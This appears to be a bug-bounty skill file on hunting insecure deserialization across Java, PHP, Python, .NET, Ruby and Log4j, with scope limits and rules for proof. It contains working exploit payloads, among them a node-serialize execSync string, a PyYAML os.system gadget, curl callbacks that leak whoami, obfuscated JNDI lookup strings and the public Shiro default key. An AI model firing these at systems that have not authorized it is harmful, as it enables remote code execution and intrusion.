---
name: hunt-deserialization
description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. URLDNS or a JNDI lookup is not RCE until a command callback lands. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
sources: hackerone_public
report_count: 22
---

# HUNT-DESERIALIZATION — Untrusted object decode

The server turns bytes you control into objects. Impact depends on the gadget that actually runs. A changed error, a `rememberMe` cookie, or a DNS lookup from `URLDNS` proves **decode or JNDI lookup**, not code execution. Claim the step you reached.

## Rails
- In-scope only. One callback or one `id`.
- No exploit-kit spray, no gadget brute force, no hashcat on ViewState/Shiro keys, no webshell.
- Do not enable remote class loading, do not load a JAR, do not `MODULE LOAD`.
- Known **default** product keys (one public Shiro key) are a single test, not a wordlist.
- Stop at draft. Never auto-submit.
- After JDK 8u191 / 11.0.1, a remote JNDI codebase is off by default. An LDAP lookup is not automatically RCE.

## Decision tree

1. **Identify the format** from the bytes, not the framework logo.

   | Magic / shape | Format |
   |---|---|
   | `AC ED 00 05` or base64 `rO0AB` | Java serialization |
   | `Content-Type: application/x-java-serialized-object`, `/invoker/`, `/wls-wsat/`, `/jmx-console/` | Java gadget sink |
   | Cookie `rememberMe=` (Shiro) | AES-wrapped Java serialization |
   | `O:<len>:"Class"` / `a:` / `C:` | PHP `unserialize` or `phar` metadata |
   | `\x80\x02`–`\x80\x05` or base64 `gASV` | Python pickle |
   | YAML `!!python/object` or `!!javax.script` | Unsafe YAML |
   | JSON `"@type"` / `["com.sun....", {` | Fastjson / Jackson default typing |
   | `\x04\x08` | Ruby Marshal |
   | `__VIEWSTATE` | .NET ViewState (LosFormatter / ObjectStateFormatter) |
   | `${jndi:` in a field that is logged | Log4j lookup — not Java serialization, same proof rules |

2. **Benign confirmation first.**
   - Java: `ysoserial URLDNS http://UNIQUE.collab/` — DNS hit means the bytes were deserialized. No library dependency. **Not RCE.**
   - Fastjson: `{"@type":"java.net.Inet4Address","val":"UNIQUE.collab"}` — DNS means autoType/lookup. **Not RCE.**
   - PHP: only a side effect counts (OOB from a real POP chain, or a property that changes a later response). A 500 on a truncated `O:` string does not.
   - Pickle / Marshal / BinaryFormatter: go straight to a single OOB gadget; there is no safe "half" execute.
   - ViewState: flip one byte. If the app still accepts it, MAC is off. If it 500s with a MAC error, stop unless you already **read** the machineKey from a file (`hunt-lfi`). Do not crack the key.
3. **Code execution, one gadget that matches what you know is loaded.**
   - Java commons-collections 3.1 → `CommonsCollections6`; 4.x → `CommonsCollections2`; Spring on the classpath → `Spring1`; otherwise stop after URLDNS and say which libraries you actually saw (JAR name, error class).
   - PHP → `phpggc` for the framework the error traces name (Laravel, Symfony, Monolog, Guzzle, Magento). Current chains, not a 2016 `__wakeup` copied from a blog. Command: `curl http://UNIQUE.collab/$(whoami)`.
   - Python pickle `__reduce__` → `os.system` or `curl`. PyYAML: `!!python/object/apply:os.system ["curl http://UNIQUE.collab/"]`.
   - Ruby: `Gem::Requirement` / `Gem::Installer` only if `YAML.load` / `Marshal.load` is the sink and the callback fires.
   - .NET: `ysoserial.net` `TypeConfuseDelegate` only with a **disabled MAC** or a key you read from config. One `curl`.
   - Node `node-serialize`: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').execSync('curl http://UNIQUE.collab/'+process.env.USER)}()"}`.
   - Jackson default typing: `JdbcRowSetImpl` with `dataSourceName: ldap://UNIQUE.collab/a` and `autoCommit: true`. LDAP hit = gadget ran. RCE only if you also get command evidence and the JDK still loads remote code, or a local gadget returns output.
4. **Log4j.** `${jndi:dns://UNIQUE.collab/a}` on one user-controlled field that is likely logged (User-Agent, username, a search box). DNS = lookup works. `${jndi:ldap://...}` follow-up fetch = JNDI client. Command callback = RCE. Obfuscation when the literal is stripped: `${${lower:j}ndi:${lower:d}ns://UNIQUE.collab/a}`. Versions 2.15 through 2.17 had bypasses; 2.17.1+ disabled the lookup. Do not claim RCE from DNS alone.
5. **Shiro.** One request with the public default key `kPH+bIxk5D2deZiIxcaaaA==` (CVE-2016-4437) wrapping a URLDNS or a curl gadget. If the cookie does not decode, stop. Do not run a key list.

## Validation
| Evidence | Claim |
|---|---|
| DNS from URLDNS / Inet4Address / `${jndi:dns}` | Deserialization or JNDI lookup. Not RCE |
| LDAP/HTTP fetch of your reference | JNDI/gadget started. Not RCE unless the next row is true |
| HTTP callback path contains `whoami`/`uid`, or body prints it | RCE as that user |
| ViewState byte flip accepted | MAC disabled. RCE only after a forged payload runs |
| PHP 500 on bad `O:` | Nothing |

Repeat a flaky callback once with a new unique host. Timing side channels need n≥10; prefer the DNS proof.

## Chains
- LFI/XXE of `web.config` or `application.yml` yields a key → then, and only then, forge ViewState or a signed token. One command.
- `phar://` on a file you uploaded → PHP unserialize of metadata. Same POP rules.
- SQLi `INTO OUTFILE` or upload of a serialized blob that a worker unpickles later (second order). Trigger the worker once.
- SSRF to a loopback Java invoker or Jenkins CLI. One gadget.
- Prototype pollution is not deserialization; if the sink is `child_process`, prove it under `hunt-rce`.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
